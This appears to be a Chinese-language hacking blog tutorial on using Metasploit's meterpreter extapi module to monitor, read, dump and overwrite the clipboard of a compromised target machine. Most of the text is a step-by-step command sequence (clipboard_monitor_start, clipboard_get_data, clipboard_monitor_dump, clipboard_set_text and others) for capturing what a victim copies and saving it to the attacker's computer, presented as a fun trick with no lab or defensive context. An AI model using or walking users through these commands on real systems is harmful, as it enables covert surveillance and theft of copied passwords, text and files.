# kali怎么获取目标剪贴板内容

> msfconsole有很多好玩的拓展模块，你知道吗？本文将为你演示`剪切板`模块的使用。当我们得到目标的shell后，我们就可以和查看键盘记录那样，查看每一步剪切板的记录。

首先，我们需要在目标机器上创建一个 `meterpreter shell`。然后，我们利用 `load`命令在会话中加载外部 api 模块即可。

![](../Images/3ce88cfb5bccae97d2dcb3399ffe84ee.png)

查看`help`命令，我们可以看到有这样一条命令，用于读取目标的剪贴板数据，转储捕获的剪贴板数据，初始化，暂停，恢复和终止对剪贴板数据的捕获，并将数据设置为目标剪贴板。

```
load
 extapi
```

![](../Images/3fb92416d50e417a634b38efb2cb5fd8.png)

### 👏启动剪贴板监控

需要注意的是，此模块不会无限期地捕获剪贴板数据，因为一旦目标将另一个数据复制到内存中，剪贴板就会被覆盖。执行下面命令，启动该api

```
clipboard_monitor_start

```

### 🌈查看复制的数据

我们将`H`盘的一个`bbskali.png`图片文件进行复制到桌面。执行下面命令

```
clipboard_get_data

```

![](../Images/89408bf497e253cc32a58818115ab2ad.png)再来看看，我们复制文字。

![](../Images/47a9088c04d799567aadd8ee59a29a4c.png)

### 🐼转储剪贴板数据

虽然我们可以看到目标剪贴板上面有什么数据，但是不能看具体文件的内容。怎么办呢？这时候我们便可以转储剪贴板上面的数据和文件了。即把对方剪贴板的数据保存到我们的电脑。执行命令

```
clipboard_monitor_dump

```

![](../Images/c45687d1fa58fcc49a5a7f6592124e96.png)

### 🦌暂停剪贴板捕获

```
clipboard_monitor_pause

```

### 🎉清除剪贴板捕获

```
clipboard_monitor_purge

```

### ☔替换剪贴板数据

```
clipboard_set_text  "欢迎关注微信公众号 kali黑客笔记 by 逍遥子大表哥"

```

### 🍔停止剪贴板捕获

```
clipboard_monitor_stop

```
